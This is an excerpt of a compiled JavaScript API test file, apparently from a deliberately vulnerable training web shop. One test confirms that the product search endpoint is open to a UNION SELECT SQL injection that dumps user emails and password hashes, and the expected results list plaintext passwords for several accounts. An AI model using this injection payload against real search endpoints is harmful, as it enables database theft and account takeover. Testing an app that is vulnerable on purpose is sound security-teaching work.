...
describe('/rest/products/search', () => {
    ...
    it('GET product search can create UNION SELECT with Users table and required columns', () => {
        return frisby.get(`${REST_URL}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
            ...
            .expect('json', 'data.?', {
            id: 1,
            price: `admin@${config_1.default.get('application.domain')}`,
            deluxePrice: security.hash('admin123')
        })
            .expect('json', 'data.?', {
            id: 2,
            price: `jim@${config_1.default.get('application.domain')}`,
            deluxePrice: security.hash('ncc-1701')
        })
            .expect('json', 'data.?', {
            id: 3,
            price: `bender@${config_1.default.get('application.domain')}`
            ...
            .expect('json', 'data.?', {
            id: 5,
            price: `ciso@${config_1.default.get('application.domain')}`,
            deluxePrice: security.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
        })
            .expect('json', 'data.?', {
            id: 6,
            price: `support@${config_1.default.get('application.domain')}`,
...
//# sourceMappingURL=searchApiSpec.js.map